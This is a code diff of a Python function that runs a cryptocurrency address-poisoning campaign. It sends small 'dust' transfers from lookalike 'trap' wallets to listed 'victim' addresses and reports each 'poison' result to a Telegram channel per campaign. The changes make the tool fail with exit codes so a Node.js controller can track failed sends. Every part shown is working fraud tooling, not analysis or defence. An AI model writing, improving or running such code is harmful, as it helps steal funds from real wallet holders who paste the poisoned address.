@@ -377,7 +377,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
             logger.warning(msg)
             print('[DEBUG] No asset found. Aborting.')
             send_telegram(msg, campaign_id=campaign_id)
-            return False
+            sys.exit(1) # 🚨 FIX: Force error exit code so Node.js knows it failed
             
         logger.info(f"Chosen asset: {asset}, dust: {dust} units")
         if info_msg:
@@ -430,24 +430,22 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         # ─── BUILD TRANSACTION (Supports BOTH Native and ERC-20) ───
         if asset == NATIVE_SYMBOL:
-            # Native transfer logic
             tx_payload = {
                 "from": trap,
                 "to": victim,
                 "value": dust,
                 "nonce": nonce,
                 "chainId": chain_id,
-                "gas": 21000,  # Native transfers always use 21000 gas
+                "gas": 21000,
                 **gas_params
             }
             tx = tx_payload
             required_eth = (21000 * effective_gas_price) + dust
         else:
-            # ERC-20 transfer logic
             token_addr = TOKEN_CONFIG.get(asset)
             if not token_addr:
                 logger.error(f"Unknown token {asset}")
-                return False
+                sys.exit(1) # 🚨 FIX
                 
             token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
             token_balance = call_with_retry(token.functions.balanceOf, trap).call()
@@ -456,7 +454,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
                 logger.warning(msg)
                 send_telegram(msg, campaign_id=campaign_id)
-                return False
+                sys.exit(1) # 🚨 FIX
 
             try:
                 estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
@@ -497,7 +495,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
             msg = f"⚠️ Insufficient {NATIVE_SYMBOL} for gas in trap {trap}. Need {w3.from_wei(required_eth, 'ether')}, have {w3.from_wei(native_balance, 'ether')}."
             logger.error(msg)
             send_telegram(msg, campaign_id=campaign_id)
-            return False
+            sys.exit(1) # 🚨 FIX
 
         signed = w3.eth.account.sign_transaction(tx, private_key)
         raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
@@ -521,23 +519,21 @@ def send_dust(private_key, victim_address, campaign_id=None):
             except AttributeError:
                 decimals = 6
             
-            # 🚀 NEW: Enhanced success message that includes the fallback explanation if applicable
             success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
             
             if info_msg:
                 success_msg += f"\n\n{info_msg}"
                 
             send_telegram(success_msg, campaign_id=campaign_id)
-            return True
         else:
             logger.error("Transaction reverted")
             send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
-            return False
+            sys.exit(1) # 🚨 FIX
             
     except Exception as e:
         logger.error(f"Error: {e}")
         send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nError: {e}", campaign_id=campaign_id)
-        return False
+        sys.exit(1) # 🚨 FIX
 
 def read_vault_lines(file_path):
     lines = []
